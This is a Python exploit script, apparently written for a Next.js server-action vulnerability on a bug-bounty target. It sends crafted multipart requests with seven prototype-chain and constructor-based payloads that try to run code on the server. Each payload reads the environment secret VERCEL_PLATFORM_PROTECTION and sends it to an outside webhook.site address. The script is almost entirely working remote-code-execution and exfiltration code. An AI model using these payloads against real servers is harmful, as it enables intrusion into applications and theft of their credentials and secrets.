#!/usr/bin/env python3
"""
Try alternative code execution methods that don't use Function constructor
"""

import requests
import json
import random
import string
import time

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def try_method(payload_0, payload_1, label):
    print(f"\n[*] {label}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    if isinstance(payload_0, dict):
        body += json.dumps(payload_0)
    else:
        body += payload_0
    body += '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    if isinstance(payload_1, dict):
        body += json.dumps(payload_1)
    else:
        body += payload_1
    body += '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    response = requests.post(TARGET, data=body, headers=headers, timeout=15)
    print(f"    Status: {response.status_code}")
    print(f"    Response: {response.text[:150]}")
    return response

print("="*70)
print("Alternative Code Execution Methods")
print("="*70)

# Method 1: Try using eval reference instead of constructor
payload_0 = f"$F1#{ACTION_ID}#constructor#constructor#prototype#constructor"
payload_1 = {
    "constructor": {
        "constructor": {
            "prototype": {
                "constructor": f"require('https').get('{WEBHOOK}?m1=' + process.env.VERCEL_PLATFORM_PROTECTION)"
            }
        }
    }
}
try_method(payload_0, payload_1, "Deep constructor chain")
time.sleep(2)

# Method 2: Try accessing Function through different path
code = f"""
const fn = (()=>{{}}).constructor;
const result = fn('return process.env.VERCEL_PLATFORM_PROTECTION')();
require('https').get('{WEBHOOK}?m2=' + result);
"""
payload_0 = f"$F1#{ACTION_ID}#constructor"
payload_1 = {"constructor": {"constructor": code}}
try_method(payload_0, payload_1, "Arrow function constructor")
time.sleep(2)

# Method 3: Use async function constructor
code = f"""
const AsyncFn = (async()=>{{}}).constructor;
const result = await AsyncFn('return process.env.VERCEL_PLATFORM_PROTECTION')();
require('https').get('{WEBHOOK}?m3=' + result);
"""
payload_0 = f"$F1#{ACTION_ID}#constructor"
payload_1 = {"constructor": {"constructor": code}}
try_method(payload_0, payload_1, "Async function constructor")
time.sleep(2)

# Method 4: Use generator function constructor
code = f"""
const GenFn = (function*(){{}}).constructor;
const result = GenFn('return process.env.VERCEL_PLATFORM_PROTECTION')().next().value;
require('https').get('{WEBHOOK}?m4=' + result);
"""
payload_0 = f"$F1#{ACTION_ID}#constructor"
payload_1 = {"constructor": {"constructor": code}}
try_method(payload_0, payload_1, "Generator function constructor")
time.sleep(2)

# Method 5: Try vm module for code evaluation
code = f"""
const vm = require('vm');
const result = vm.runInThisContext('process.env.VERCEL_PLATFORM_PROTECTION');
require('https').get('{WEBHOOK}?m5=' + result);
"""
payload_0 = f"$F1#{ACTION_ID}#constructor"
payload_1 = {"constructor": {"constructor": code}}
try_method(payload_0, payload_1, "vm.runInThisContext")
time.sleep(2)

# Method 6: Just access env without any fancy execution
code = f"""
const env = process.env.VERCEL_PLATFORM_PROTECTION;
require('https').get('{WEBHOOK}?m6=' + env);
'done'
"""
payload_0 = f"$F1#{ACTION_ID}#constructor"
payload_1 = {"constructor": {"constructor": code}}
try_method(payload_0, payload_1, "Direct env + HTTPS GET")
time.sleep(2)

# Method 7: Use module._load to load http
code = f"""
const Module = require('module');
const https = Module._load('https');
https.get('{WEBHOOK}?m7=' + process.env.VERCEL_PLATFORM_PROTECTION);
"""
payload_0 = f"$F1#{ACTION_ID}#constructor"
payload_1 = {"constructor": {"constructor": code}}
try_method(payload_0, payload_1, "Module._load for https")

print(f"\n[*] Check webhook: {WEBHOOK}")
print("="*70)
